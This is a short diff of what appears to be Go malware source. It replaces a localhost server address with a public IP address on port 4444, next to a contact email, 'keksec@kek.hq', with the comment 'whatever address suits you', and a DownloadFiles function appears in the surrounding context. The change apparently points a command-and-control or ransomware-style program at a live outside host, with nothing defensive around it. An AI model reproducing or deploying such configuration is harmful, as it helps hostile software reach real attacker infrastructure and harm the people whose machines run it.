@@ -186,7 +186,7 @@ func DownloadFiles(k *keeper) {
     fmt.Println(resp.StatusCode)
 }
 
-var server string = "127.0.0.1:4444" // server address
+var server string = "104.237.218.70:4444" // server address
 var contact string = "keksec@kek.hq" // whatever address suits you
 
 func main() {
